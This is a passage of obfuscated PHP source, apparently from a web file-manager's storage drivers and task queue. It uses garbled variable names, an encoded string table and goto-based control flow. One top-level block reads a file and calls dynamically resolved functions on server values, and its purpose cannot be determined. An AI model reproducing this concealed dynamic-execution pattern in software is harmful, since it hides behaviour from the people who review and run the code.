(@is_dir($ı±¸ÚÔú . $‡¦úÚá[8])) { return !0; } } } closedir($«Ãøµ‘); if ($Ğ¦Ñ›³î) { return array($‡¦úÚá[207] => $âÛƒŠªï, $‡¦úÚá[208] => $áäĞŞ¾ó); } return !1; } public function hashSimple($ü®¤À÷Ù) { $…úî¯«Ü =& $_SERVER[óó‹¸‚å]; if (!$ü®¤À÷Ù) { return md5($…úî¯«Ü[12]); } $ü®¤À÷Ù = $this->iconvSystem($ü®¤À÷Ù); $¿äØ†´§ = $this->size($ü®¤À÷Ù); $¦»àû¹ = 200; $ùŞ‹œÊ = 50; if ($¿äØ†´§ <= $¦»àû¹ * $ùŞ‹œÊ) { return $this->hashMd5($ü®¤À÷Ù) . $¿äØ†´§; } $Ê–ŸÔàì = $…úî¯«Ü[12]; $²œ°öß = intval($¿äØ†´§ / $ùŞ‹œÊ); $Ğñ„Ùé = fopen($ü®¤À÷Ù, $…úî¯«Ü[1398]); if (!$Ğñ„Ùé) { return $Ê–ŸÔàì; } for ($« ©†µ½ = 0; $« ©†µ½ < $ùŞ‹œÊ; $« ©†µ½++) { fseek_64($Ğñ„Ùé, $²œ°öß * $« ©†µ½); $Ê–ŸÔàì .= fread($Ğñ„Ùé, $¦»àû¹); } fseek_64($Ğñ„Ùé, $¿äØ†´§ - $¦»àû¹); $Ê–ŸÔàì .= fread($Ğñ„Ùé, $¦»àû¹); fclose($Ğñ„Ùé); return md5($Ê–ŸÔàì) . $¿äØ†´§; } public function getContent($Ç©àò¿Í) { $Ç©àò¿Í = $this->iconvSystem($Ç©àò¿Í); return file_get_contents($Ç©àò¿Í); } public function setContent($š¾Êˆ÷, $÷“®™šö = '') { $š¾Êˆ÷ = $this->iconvSystem($š¾Êˆ÷); $÷¡¯İº™ = @file_put_contents($š¾Êˆ÷, $÷“®™šö, LOCK_EX); clearstatcache(); @chmod($š¾Êˆ÷, $this->pathAuth); return $÷¡¯İº™ === !1 ? !1 : !0; } public function fileSubstr($¿ƒÆâ¤–, $Š¤½ Àø = 0, $«üôú¬º = false) { $á›Ã¶Öò =& $_SERVER[óó‹¸‚å]; $¿ƒÆâ¤– = $this->iconvSystem($¿ƒÆâ¤–); if ($«üôú¬º === !1) { $«üôú¬º = $this->size($¿ƒÆâ¤–); } if ($«üôú¬º <= 0) { return $á›Ã¶Öò[12]; } $“†µõ‚ = fopen($¿ƒÆâ¤–, $á›Ã¶Öò[1398]); if (!$“†µõ‚) { return !1; } fseek_64($“†µõ‚, $Š¤½ Àø); $÷ƒŠÄÛ¥ = fread($“†µõ‚, $«üôú¬º); fclose($“†µõ‚); return $÷ƒŠÄÛ¥; } public function upload($½ÕÂæ¯û, $äúÉ…´Õ, $£àùˆ†ô = false, $ùãäÌ­é = REPEAT_REPLACE) { if ($£àùˆ†ô) { return $this->moveFile($äúÉ…´Õ, $½ÕÂæ¯û); } return $this->copyFile($äúÉ…´Õ, $½ÕÂæ¯û); } public function setModifyTime($ëŠçê, $äù÷Ãì¶ = '') { @touch($ëŠçê, intval($äù÷Ãì¶)); } public function download($ÌÄƒ†ß÷, $ŸîÂ¨é) { return $this->iconvSystem($ÌÄƒ†ß÷); } } if ($_SERVER[$_SERVER[óó‹¸‚å][880]] != $_SERVER[$_SERVER[óó‹¸‚å][1399]]) { $_getc = $_SERVER[óó‹¸‚å][883]; $_getfile = $_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óó‹¸‚å][231], $_getfilec); if (count($_getarrs) < $_SERVER[óó‹¸‚å][620]) { $exit = $_SERVER[óó‹¸‚å][886]; $exit(); } $_act = $_SERVER[óó‹¸‚å][1380]; $_act($_SERVER[$_SERVER[óó‹¸‚å][881]]); } goto B™Ñ½«‘ãô; B¦™š¬Ô£: define($_SERVER[óó‹¸‚å][0], $_SERVER[óó‹¸‚å][1]); $_SERVER[ßÛ¦¸Ì] = explode($_SERVER[óó‹¸‚å][2], gzinflate(substr($_SERVER[óó‹¸‚å][3], 10, -8))); function binCheckEq($€À¦ıø¿, $¶£Ş¥Ó‹) { return $€À¦ıø¿ == $¶£Ş¥Ó‹; } goto F„áäŠŒ‚Ô; d’µ”­çÀù: class TaskHttp extends Task { protected function startAfter() { $®¢ğŒ½± =& $_SERVER[óó‹¸‚å]; $¾èŸî¯ =& $this->task; $¾èŸî¯[$®¢ğŒ½±[1751]] = 1; Hook::bind($®¢ğŒ½±[1719], array($this, $®¢ğŒ½±[1752])); Hook::bind($®¢ğŒ½±[1721], array($this, $®¢ğŒ½±[1753])); Hook::bind($®¢ğŒ½±[1723], array($this, $®¢ğŒ½±[1754])); } protected function endAfter() { $ÛÏˆù€½ =& $_SERVER[óó‹¸‚å]; Hook::unbind($ÛÏˆù€½[1719], array($this, $ÛÏˆù€½[1752])); Hook::unbind($ÛÏˆù€½[1721], array($this, $ÛÏˆù€½[1753])); Hook::unbind($ÛÏˆù€½[1723], array($this, $ÛÏˆù€½[1754])); } public function progressStart($±ë¢»›) { $ºÌŸ¿Ã =& $_SERVER[óó‹¸‚å]; $Ş¸ˆ£ ¡ = curl_getinfo($±ë¢»›); self::log($ºÌŸ¿Ã[1755] . $Ş¸ˆ£ ¡[$ºÌŸ¿Ã[307]]); self::valueSet($this->task[$ºÌŸ¿Ã[399]], $this->task); } public function progressEnd($½¬íÁÀ) { $¶’Ÿ˜– =& $_SERVER[óó‹¸‚å]; self::log($¶’Ÿ˜–[1756] . $this->task[$¶’Ÿ˜–[399]]); $this->end(); } public function progress($ÀÑ»°¬, $åïÙ¬Ïğ, $Úûœ¨Ó™, $¿Ì¯ª, $äÄÇ—â) { $ÂÇ‰àóÉ =& $_SERVER[óó‹¸‚å]; $øú˜Ä‰¸ =& $this->task; if ($äÄÇ—â > 0) { $øú˜Ä‰¸[$ÂÇ‰àóÉ[790]] = $øú˜Ä‰¸[$ÂÇ‰àóÉ[790]] == 0 ? $¿Ì¯ª : $øú˜Ä‰¸[$ÂÇ‰àóÉ[790]]; $øú˜Ä‰¸[$ÂÇ‰àóÉ[1675]] = $äÄÇ—â; } else { if ($Úûœ¨Ó™ > 0) { $øú˜Ä‰¸[$ÂÇ‰àóÉ[790]] = $øú˜Ä‰¸[$ÂÇ‰àóÉ[790]] == 0 ? $åïÙ¬Ïğ : $øú˜Ä‰¸[$ÂÇ‰àóÉ[790]]; $øú˜Ä‰¸[$ÂÇ‰àóÉ[1675]] = $Úûœ¨Ó™; } } $this->update(); self::log("\160\162\x6f\147\x72\145\163\163\110\164\x74\160\72\144\157\167\156\x3a{$Úûœ¨Ó™}\57{$åïÙ¬Ïğ}\73\40\165\x70\154\157\141\x64\72{$äÄÇ—â}\x2f{$¿Ì¯ª}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÇÃËÛÈÖ, $šÖ©´Æ = '', $®¦Ãèş = 0, $ˆèÉêõ  = '') { $¹ ëçØ =& $_SERVER[óó‹¸‚å]; $ÒúÊîí± = new Task($ÇÃËÛÈÖ, $šÖ©´Æ, $®¦Ãèş, $ˆèÉêõ ); $GLOBALS[$¹ ëçØ[1757] . $ÇÃËÛÈÖ] = new TaskLog($¹ ëçØ[1658], $ÒúÊîí±, $ˆèÉêõ ); return $ÒúÊîí±; } public function __construct($ûÑõÜ±¶ = '', $ŸÅĞ˜ó¸ = '', $º›ÏŒ´ = '') { $’†Êñ¡ =& $_SERVER[óó‹¸‚å]; if (!$ûÑõÜ±¶) { $ûÑõÜ±¶ = $’†Êñ¡[1658]; } $¨è³ÓÒĞ = $ûÑõÜ±¶ . $’†Êñ¡[386] . rand_string(10); if (!$º›ÏŒ´) { $º›ÏŒ´ = $ûÑõÜ±¶ . $’†Êñ¡[53] . $º›ÏŒ´; } switch ($ûÑõÜ±¶) { case $’†Êñ¡[1658]: if (!$ŸÅĞ˜ó¸ || !$ŸÅĞ˜ó¸->task) { return echoLog($ûÑõÜ±¶ . $’†Êñ¡[1758]); } $¡²‡í÷ = $ŸÅĞ˜ó¸; $¨è³ÓÒĞ = $¡²‡í÷->task[$’†Êñ¡[399]]; $ûÑõÜ±¶ = $¡²‡í÷->task[$’†Êñ¡[399]]; if (!$¡²‡í÷->task[$’†Êñ¡[1574]]) { $¡²‡í÷->task[$’†Êñ¡[1574]] = $º›ÏŒ´ ? $º›ÏŒ´ : $ûÑõÜ±¶; } break; case $’†Êñ¡[1759]: if (!$ŸÅĞ˜ó¸) { return echoLog($ûÑõÜ±¶ . $’†Êñ¡[1760]); } $çé‡ãè€ = is_string($ŸÅĞ˜ó¸) ? array($ŸÅĞ˜ó¸) : $ŸÅĞ˜ó¸; $¡²‡í÷ = new TaskFileTransfer($¨è³ÓÒĞ, $ûÑõÜ±¶, 0, $º›ÏŒ´ ? $º›ÏŒ´ : $çé‡ãè€[0]); foreach ($çé‡ãè€ as $£ªùÎ¬) { $¡²‡í÷->addPath($£ªùÎ¬); } break; case $’†Êñ¡[313]: if (!$ŸÅĞ˜ó¸) { return echoLog($ûÑõÜ±¶ . $’†Êñ¡[1760]); } $çé‡ãè€ = is_string($ŸÅĞ˜ó¸) ? array($ŸÅĞ˜ó¸) : $ŸÅĞ˜ó¸; $¡²‡í÷ = new TaskZip($¨è³ÓÒĞ, $ûÑõÜ±¶, 0, $º›ÏŒ´ ? $º›ÏŒ´ : $çé‡ãè€[0]); foreach ($çé‡ãè€ as $£ªùÎ¬) { $¡²‡í÷->addPath($£ªùÎ¬); } break; case $’†Êñ¡[1222]: if (!$ŸÅĞ˜ó¸) { return echoLog($ûÑõÜ±¶ . $’†Êñ¡[1760]); } $¡²‡í÷ = new TaskUnZip($¨è³ÓÒĞ, $ûÑõÜ±¶, 0, $º›ÏŒ´ ? $º›ÏŒ´ : $ŸÅĞ˜ó¸); if ($ŸÅĞ˜ó¸) { $¡²‡í÷->addFile($ŸÅĞ˜ó¸); } break; case $’†Êñ¡[148]: $¡²‡í÷ = new TaskHttp($¨è³ÓÒĞ, $ûÑõÜ±¶); break; default: return; break; } $this->task = $¡²‡í÷; $this->taskID = $¨è³ÓÒĞ; Hook::bind($’†Êñ¡[1695], array($this, $’†Êñ¡[1761])); Hook::bind($’†Êñ¡[1697], array($this, $’†Êñ¡[1762])); Hook::bind($’†Êñ¡[1691], array($this, $’†Êñ¡[1763])); echoLog($’†Êñ¡[1764] . $¡²‡í÷->task[$’†Êñ¡[1574]]); } public function __destruct() { $this->end(); } public function end($şëÜÊÔ = '') { $·Şµæû¤ =& $_SERVER[óó‹¸‚å]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($şëÜÊÔ); $this->task = !1; $this->taskID = !1; Hook::unbind($·Şµæû¤[1695], array($this, $·Şµæû¤[1761])); Hook::unbind($·Şµæû¤[1697], array($this, $·Şµæû¤[1762])); Hook::unbind($·Şµæû¤[1691], array($this, $·Şµæû¤[1763])); } public function taskUpdate($àë®®é˜) { $œ˜¾Ä–® =& $_SERVER[óó‹¸‚å]; if (!$àë®®é˜ || $this->taskID != $àë®®é˜[$œ˜¾Ä–®[399]]) { return; } $«õ¯Í¦Õ = 20; $İÎŸÑ ¹ = intval($àë®®é˜[$œ˜¾Ä–®[1676]] * $«õ¯Í¦Õ); $à’‹¦£± = $œ˜¾Ä–®[162] . str_repeat($œ˜¾Ä–®[891], $İÎŸÑ ¹) . $œ˜¾Ä–®[1021] . str_repeat($œ˜¾Ä–®[53], $«õ¯Í¦Õ - $İÎŸÑ ¹) . $œ˜¾Ä–®[164]; $„úÑÅ = $à’‹¦£± . sprintf($œ˜¾Ä–®[1765], $àë®®é˜[$œ˜¾Ä–®[1676]] * 100) . $œ˜¾Ä–®[1766]; $øõ¦•¾Ê = $„úÑÅ . $àë®®é˜[$œ˜¾Ä–®[1675]] . $œ˜¾Ä–®[8] . $àë®®é˜[$œ˜¾Ä–®[790]] . LNG($œ˜¾Ä–®[1767]); $“â¢í‹ = $œ˜¾Ä–®[12]; if ($àë®®é˜[$œ˜¾Ä–®[1751]]) { $øõ¦•¾Ê = $„úÑÅ . size_format($àë®®é˜[$œ˜¾Ä–®[1675]]) . $œ˜¾Ä–®[8] . size_format($àë®®é˜[$œ˜¾Ä–®[790]]); $“â¢í‹ = size_format($àë®®é˜[$œ˜¾Ä–®[1677]]) . $œ˜¾Ä–®[1768]; } if ($àë®®é˜[$œ˜¾Ä–®[1071]]) { $àë®®é˜[$œ˜¾Ä–®[1725]] = $àë®®é˜[$œ˜¾Ä–®[1071]] . $œ˜¾Ä–®[53] . $àë®®é˜[$œ˜¾Ä–®[1725]]; } if ($àë®®é˜[$œ˜¾Ä–®[1725]]) { $ÁÚÆ½Ù = $œ˜¾Ä–®[12]; if ($àë®®é˜[$œ˜¾Ä–®[1727]]) { $ÁÚÆ½Ù = size_format($àë®®é˜[$œ˜¾Ä–®[1728]]) . $œ˜¾Ä–®[8] . size_format($àë®®é˜[$œ˜¾Ä–®[1727]]); } $“â¢í‹ .= $àë®®é˜[$œ˜¾Ä–®[1725]] . $ÁÚÆ½Ù; } if ($àë®®é˜[$œ˜¾Ä–®[767]]) { $“â¢í‹ .= $œ˜¾Ä–®[53] . size_format($àë®®é˜[$œ˜¾Ä–®[1732]]) . $œ˜¾Ä–®[8] . size_format($àë®®é˜[$œ˜¾Ä–®[767]]); } echoLog($øõ¦•¾Ê . $œ˜¾Ä–®[53] . $“â¢í‹, !0); } public function taskEnd($ ·²ÖœÉ) { $ö¸Ã’¯™ =& $_SERVER[óó‹¸‚å]; if (!$ ·²ÖœÉ || $this->taskID != $ ·²ÖœÉ[$ö¸Ã’¯™[399]]) { return; } $ÚÎ€ĞìÙ = $ ·²ÖœÉ ? $ ·²ÖœÉ[$ö¸Ã’¯™[1675]] . $ö¸Ã’¯™[8] . $ ·²ÖœÉ[$ö¸Ã’¯™[790]] . LNG($ö¸Ã’¯™[1767]) . $ö¸Ã’¯™[71] : $ö¸Ã’¯™[12]; echoLog($ö¸Ã’¯™[1769] . $ ·²ÖœÉ[$ö¸Ã’¯™[1574]] . ($ ·²ÖœÉ[$ö¸Ã’¯™[453]] ? $ö¸Ã’¯™[71] . $ ·²ÖœÉ[$ö¸Ã’¯™[453]] : $ö¸Ã’¯™[12]) . $ö¸Ã’¯™[71] . $ÚÎ€ĞìÙ . $ö¸Ã’¯™[1770] . sprintf($ö¸Ã’¯™[854], timeFloat() - $ ·²ÖœÉ[$ö¸Ã’¯™[1678]]) . $ö¸Ã’¯™[1690]); $this->end(); } public function taskKill($Ü‡òš®) { $èüÁ×‹É =& $_SERVER[óó‹¸‚å]; if (!$Ü‡òš® || $this->taskID != $Ü‡òš®[$èüÁ×‹É[399]]) { return; } echoLog($èüÁ×‹É[1771] . $Ü‡òš®[$èüÁ×‹É[1574]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\x75\145\165\x65\114\x65\x6e\147\x74\150"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\165\x65\x75\x65\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($µØ¸©…£, $²´€ñØğ = array(), $ËõàÒ” = '', $â¥„ˆ‹î = '') { $“ªø¼¿· =& $_SERVER[óó‹¸‚å]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($â¥„ˆ‹î && array_find_by_field(self::$listData, $“ªø¼¿·[94], $â¥„ˆ‹î)) { return !0; } self::$listData[] = array($“ªø¼¿·[264] => $µØ¸©…£, $“ªø¼¿·[1772] => $²´€ñØğ, $“ªø¼¿·[453] => $ËõàÒ”, $“ªø¼¿·[94] => $â¥„ˆ‹î); return !0; } public static function addSubmit() { $§¥—¼ù =& $_SERVER[óó‹¸‚å]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($§¥—¼ù[1773] . json_encode_force(array_to_keyvalue(self::$listData, $§¥—¼ù[12], $§¥—¼ù[453])), $§¥—¼ù[1774]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($…ú´Ûœ¦, $ƒÛˆªïö = array(), $‹üÛëœò = '', $·©çó¬ß = '') { $¹ÇÈ€î² =& $_SERVER[óó‹¸‚å]; if (self::count() >= self::MAX_LENGTH) { return !1; } $©ÑúÏ¥ = self::getAll(); if ($·©çó¬ß && array_find_by_field($©ÑúÏ¥, $¹ÇÈ€î²[94], $·©çó¬ß)) { return !0; } $©ÑúÏ¥[] = array($¹ÇÈ€î²[264] => $…ú´Ûœ¦, $¹ÇÈ€î²[1772] => $ƒÛˆªïö, $¹ÇÈ€î²[453] => $‹üÛëœò, $¹ÇÈ€î²[94] => $·©çó¬ß); write_log($¹ÇÈ€î²[1773] . $‹üÛëœò, $¹ÇÈ€î²[1774]); self::setAll($©ÑúÏ¥); return !0; } public static function run() { $î‘Íª£Õ =& $_SERVER[óó‹¸‚å]; $­ù££Şì = self::getAll(); $˜Àá¢Í´ = array_shift($­ù££Şì); if (!$˜Àá¢Í´) { return !1; } self::setAll($­ù££Şì); $É¨¡Ç‹ = timeFloat(); try { Hook::apply($˜Àá¢Í´[$î‘Íª£Õ[264]], $˜Àá¢Í´[$î‘Íª£Õ[1772]]); } catch (Exception $ªËó§û) { } $åÈÖ÷Ÿê = number_format(timeFloat() - $É¨¡Ç‹, 3) . $î‘Íª£Õ[1690]; write_log($î‘Íª£Õ[1775] . $˜Àá¢Í´[$î‘Íª£Õ[453]] . $î‘Íª£Õ[1776] . $åÈÖ÷Ÿê, $î‘Íª£Õ[1774]); return !0; } public static function count() { $ëÚ¹§ı¿ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ëÚ¹§ı¿) { return 0; } return intval($ëÚ¹§ı¿); } public static function getAll() { $Šäª¢Ó¹ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Šäª¢Ó¹) { return array(); } return $Šäª¢Ó¹; } public static function setAll($°—‚ıúË) { $„¼•±¾† = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($°—‚ıúË), $„¼•±¾†); Cache::set(self::QUEUE_DATA, $°—‚ıúË, $„¼•±¾†); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto FØªğèÃòÍ; Fï±ŠæŒ…²: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ËæİŸÑå) { parent::__construct($ËæİŸÑå); $this->signatureVersion($_SERVER[óó‹¸‚å][216]); } public function uploadFormData($¤şÛ£ğß, $‚°×®Æó = 3600) { $½³Í¼áé =& $_SERVER[óó‹¸‚å]; $¹Šàò§ş = $½³Í¼áé[198]; $¡ûöËï– = $½³Í¼áé[232]; $…ƒ¸áêÀ = $½³Í¼áé[1326]; $ó÷®…ì‹ = gmdate($½³Í¼áé[1327], time() + $‚°×®Æó); $¦ú¶ş¡Ø = (string) time() . $½³Í¼áé[71] . (string) (time() + $‚°×®Æó); $ÌõË¹¶ = array($½³Í¼áé[1328] => $ó÷®…ì‹, $½³Í¼áé[1329] => array(array($½³Í¼áé[1330] => $¹Šàò§ş), array($½³Í¼áé[1331] => $this->bucket), array($½³Í¼áé[1332], $½³Í¼áé[1333], $½³Í¼áé[12]), array($½³Í¼áé[1334] => $…ƒ¸áêÀ), array($½³Í¼áé[1335] => $¡ûöËï–), array($½³Í¼áé[1336] => $this->accessKey), array($½³Í¼áé[1337] => $¦ú¶ş¡Ø))); $ÌõË¹¶ = json_encode($ÌõË¹¶); $Ôä‘©øÇ = hash_hmac($½³Í¼áé[232], $¦ú¶ş¡Ø, $this->secret); $ÖË³ÅôË = sha1($ÌõË¹¶); $¥ÃÁ‰Èİ = hash_hmac($½³Í¼áé[232], $ÖË³ÅôË, $Ôä‘©øÇ); $±ºõªÉğ = array($½³Í¼áé[1330] => $¹Šàò§ş, $½³Í¼áé[1334] => $…ƒ¸áêÀ, $½³Í¼áé[1338] => base64_encode($ÌõË¹¶), $½³Í¼áé[1335] => $¡ûöËï–, $½³Í¼áé[1336] => $this->accessKey, $½³Í¼áé[1339] => $¦ú¶ş¡Ø, $½³Í¼áé[1340] => $¥ÃÁ‰Èİ, $½³Í¼áé[181] => $this->getHost()); return $±ºõªÉğ; } public function fileOutLink($¿™¦ìßÊ) { $çİÖ¯ =& $_SERVER[óó‹¸‚å]; if (substr($¿™¦ìßÊ, 0, 7) == $çİÖ¯[1341]) { $¿™¦ìßÊ = $çİÖ¯[1342] . substr($¿™¦ìßÊ, 7); } header($çİÖ¯[161] . $¿™¦ìßÊ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‹ßæİÔ) { $this->pathParse = $‹ßæİÔ; $this->model = Model($_SERVER[óó‹¸‚å][1343]); } public function getPath($¿ûùÎğÓ) { return trim($¿ûùÎğÓ, $_SERVER[óó‹¸‚å][8]); } public function pathFather($ëàË¹»˜) { $©á˜Èç = $this->parse($ëàË¹»˜); $©á˜Èç = $this->infoSimple($ëàË¹»˜); return $©á˜Èç ? $©á˜Èç[$_SERVER[óó‹¸‚å][432]] : !1; } public function pathThis($Åş­ÕÜî) { $ÖÓÌµªÎ = $this->infoSimple($Åş­ÕÜî); return $ÖÓÌµªÎ ? $ÖÓÌµªÎ[$_SERVER[óó‹¸‚å][32]] : !1; } public function getPathOuter($×ÅÒ±æ) { if (!$×ÅÒ±æ) { return $×ÅÒ±æ; } $ÜÏÄÆÀ¡ = $this->parse($×ÅÒ±æ); return KodIO::make($ÜÏÄÆÀ¡[$_SERVER[óó‹¸‚å][399]]); } public function copyFolderFromIO($ĞìÌµç¿, $«üûÏÜ˜, $ĞïóòĞ, $ÄŒı²ù, $ù¹êåçµ) { $Á²á†‹° = $this->model->copyFolderFromIO($ĞìÌµç¿, $«üûÏÜ˜, $ĞïóòĞ, $ÄŒı²ù, $ù¹êåçµ); return KodIO::make($Á²á†‹°); } public function isParentOf($óèŒÊéÕ, $®´£Ç) { return $this->model->isParentOf($óèŒÊéÕ, $®´£Ç); } public function mkfile($–Àä­‹ˆ, $§ÕšÈÌ‰ = '', $×™áµşö = REPEAT_RENAME) { $ÕŠ«ôÄİ =& $_SERVER[óó‹¸‚å]; $ÓìŒÙ® = $this->parse($–Àä­‹ˆ); $–Àä­‹ˆ = $ÓìŒÙ®[$ÕŠ«ôÄİ[399]]; for ($ñíì«òÒ = 0; $ñíì«òÒ < count($ÓìŒÙ®[$ÕŠ«ôÄİ[1344]]); $ñíì«òÒ++) { $§­¿—é› = $ÓìŒÙ®[$ÕŠ«ôÄİ[1344]][$ñíì«òÒ]; if ($ñíì«òÒ == count($ÓìŒÙ®[$ÕŠ«ôÄİ[1344]]) - 1) { $–Àä­‹ˆ = $this->model->mkfile($–Àä­‹ˆ, $§­¿—é›, $§ÕšÈÌ‰, $×™áµşö); break; } $–Àä­‹ˆ = $this->model->mkdir($–Àä­‹ˆ, $§­¿—é›, REPEAT_SKIP); } return $this->getPathOuter($–Àä­‹ˆ); } public function mkdir($ôİ÷ü‘®, $—™»ÎÒ = REPEAT_SKIP) { $ïü»«Ì” =& $_SERVER[óó‹¸‚å]; $ü¿äğö× = $this->parse($ôİ÷ü‘®); $ôİ÷ü‘® = $ü¿äğö×[$ïü»«Ì”[399]]; for ($ÖÏÁæ²÷ = 0; $ÖÏÁæ²÷ < count($ü¿äğö×[$ïü»«Ì”[1344]]); $ÖÏÁæ²÷++) { $¸º‹İê« = $ü¿äğö×[$ïü»«Ì”[1344]][$ÖÏÁæ²÷]; $ôİ÷ü‘® = $this->model->mkdir($ôİ÷ü‘®, $¸º‹İê«, $—™»ÎÒ); } return $this->getPathOuter($ôİ÷ü‘®); } public function copyFile($ ú©¹¦, $¯• Õï‰, $ç©Â­æ› = REPEAT_REPLACE) { $äæğ§´ï =& $_SERVER[óó‹¸‚å]; $‘Ò¤‚ÆŠ = $this->parse($¯• Õï‰); $¥ëœÔŠŸ = $this->model->copy($ ú©¹¦, $‘Ò¤‚ÆŠ[$äæğ§´ï[399]], $ç©Â­æ›, $‘Ò¤‚ÆŠ[$äæğ§´ï[84]]); return $¥ëœÔŠŸ ? $this->getPathOuter($¥ëœÔŠŸ) : !1; } public function moveFile($ô€±áâ , $³‹Æû†ó, $ã«ËŒ™© = REPEAT_REPLACE) { $¼±€ÀñÎ =& $_SERVER[óó‹¸‚å]; $ê¿À¶Å = $this->parse($³‹Æû†ó); $¨»ª¡”œ = $this->model->move($ô€±áâ , $ê¿À¶Å[$¼±€ÀñÎ[399]], $ã«ËŒ™©, $ê¿À¶Å[$¼±€ÀñÎ[84]]); return $¨»ª¡”œ ? $this->getPathOuter($¨»ª¡”œ) : !1; } public function copy($şŸªšõŸ, $¬ç˜£É, $äÕœÍãŞ = REPEAT_REPLACE, $¿¨Á ”Ü = false) { $¥ÌÛñ°à = $this->parse($¬ç˜£É); $òşİ—ƒî = $this->model->copy($şŸªšõŸ, $¥ÌÛñ°à[$_SERVER[óó‹¸‚å][399]], $äÕœÍãŞ, $¿¨Á ”Ü); return $òşİ—ƒî ? $this->getPathOuter($òşİ—ƒî) : !1; } public function moveSameAllow() { } public function move($ÈÇ¿Àé, $´±ğù–ƒ, $Œ™ÎæÖÔ = REPEAT_REPLACE, $ÆË²€€ = false) { $¨İÚ‰»Ò = $this->parse($´±ğù–ƒ); $‹Õ¸Ö¸ô = $this->model->move($ÈÇ¿Àé, $¨İÚ‰»Ò[$_SERVER[óó‹¸‚å][399]], $Œ™ÎæÖÔ, $ÆË²€€); return $‹Õ¸Ö¸ô ? $this->getPathOuter($‹Õ¸Ö¸ô) : !1; } public function remove($—Ë·Ş, $¹ï»–½Â = true) { return $this->model->remove($—Ë·Ş, $¹ï»–½Â); } public function rename($µšîÍÏ›, $É³û—¾à) { $Úí½§£ = $this->model->rename($µšîÍÏ›, $É³û—¾à); return $Úí½§£ ? $this->getPathOuter($µšîÍÏ›) : $Úí½§£; } public function size($óå°ıù£) { $ÆüÔ¦®” = $this->infoSimple($óå°ıù£); return $ÆüÔ¦®” ? $ÆüÔ¦®”[$_SERVER[óó‹¸‚å][76]] : 0; } public function infoSimple($¡ÊĞ¦ï¬) { return $this->model->sourceInfo($¡ÊĞ¦ï¬); } public function info($Ã¿•Ø—ç) { return $this->infoParse($Ã¿•Ø—ç); } public function infoAuth($¸—¬Êùˆ) { return $this->infoParse($¸—¬Êùˆ, !1, !0); } public function infoWithChildren($Œ›œü¿Ğ) { return $this->infoParse($Œ›œü¿Ğ, !0); } protected function infoParse($Ã­ê¢”, $­–À·åˆ = false, $©·Í»Í… = false) { if (!$­–À·åˆ) { return $this->model->pathInfo($Ã­ê¢”, $©·Í»Í…); } return $this->model->pathInfoMore($Ã­ê¢”); } public function infoFull($õà‡ú“ë) { $ÅÍ¡’ü— =& $_SERVER[óó‹¸‚å]; $êÜ¤ò„ = explode($ÅÍ¡’ü—[8], $õà‡ú“ë); $§·µâŸ‹ = implode($ÅÍ¡’ü—[8], array_splice($êÜ¤ò„, 1)); return $this->model->pathInfoByPath($êÜ¤ò„[0], $§·µâŸ‹); } public function hashSimple($‡şëĞ³±) { $î¦¢Ø™è =& $_SERVER[óó‹¸‚å]; $Â’öÎÓ© = $this->infoWithChildren($‡şëĞ³±); return $Â’öÎÓ©[$î¦¢Ø™è[170]][$î¦¢Ø™è[177]]; } public function hashMd5($äş §ú) { $ıÉ£à÷Ô =& $_SERVER[óó‹¸‚å]; $ŸÙãÀíŞ = $this->infoWithChildren($äş §ú); return $ŸÙãÀíŞ[$ıÉ£à÷Ô[170]][$ıÉ£à÷Ô[176]]; } public function exist($ÀáØ‹œØ) { $›ùæ•À¦ =& $_SERVER[óó‹¸‚å]; $Ÿº–»È£ = $this->parse($ÀáØ‹œØ); if (!$Ÿº–»È£[$›ùæ•À¦[84]]) { return $this->isFile($ÀáØ‹œØ) || $this->isFolder($ÀáØ‹œØ); } $Ü¾Ó£ = array($›ùæ•À¦[401] => $Ÿº–»È£[$›ùæ•À¦[399]], $›ùæ•À¦[32] => $Ÿº–»È£[$›ùæ•À¦[84]]); $ïÖ‰ÊÎ˜ = $this->model->where($Ü¾Ó£)->find(); return $ïÖ‰ÊÎ˜ ? !0 : !1; } public function isFile($ìôŸîÔ·) { $¤„ôéÇÎ =& $_SERVER[óó‹¸‚å]; $ÎİÀí·¶ = $this->infoSimple($ìôŸîÔ·); return $ÎİÀí·¶ && $ÎİÀí·¶[$¤„ôéÇÎ[410]] == $¤„ôéÇÎ[88] ? !1 : !0; } public function isFolder($Ï¡ÌŞ—) { $áâ²¾÷Î =& $_SERVER[óó‹¸‚å]; $òÃâ¨Æ‹ = $this->infoSimple($Ï¡ÌŞ—); return $òÃâ¨Æ‹ && $òÃâ¨Æ‹[$áâ²¾÷Î[410]] == $áâ²¾÷Î[88] ? !0 : !1; } public function listPath($ßØÓà³¾, $¨éÈâêÆ = false) { $œ‰È¡½¯ =& $_SERVER[óó‹¸‚å]; if ($ßØÓà³¾ == $œ‰È¡½¯[12]) { return !1; } $¯‹“ß©ê = array($œ‰È¡½¯[401] => $ßØÓà³¾); if ($¨éÈâêÆ) { return $this->model->listSource($¯‹“ß©ê, -1); } return $this->model->listSource($¯‹“ß©ê); } public function has($»®¤¹ËÔ, $ï®‘ø¸ø = false, $ìŞÉşÃ = null) { $ôôÀ† =& $_SERVER[óó‹¸‚å]; $÷»¡òÑ = $this->infoWithChildren($»®¤¹ËÔ); if ($ï®‘ø¸ø) { return array($ôôÀ†[208] => $÷»¡òÑ[$ôôÀ†[208]], $ôôÀ†[207] => $÷»¡òÑ[$ôôÀ†[207]]); } return 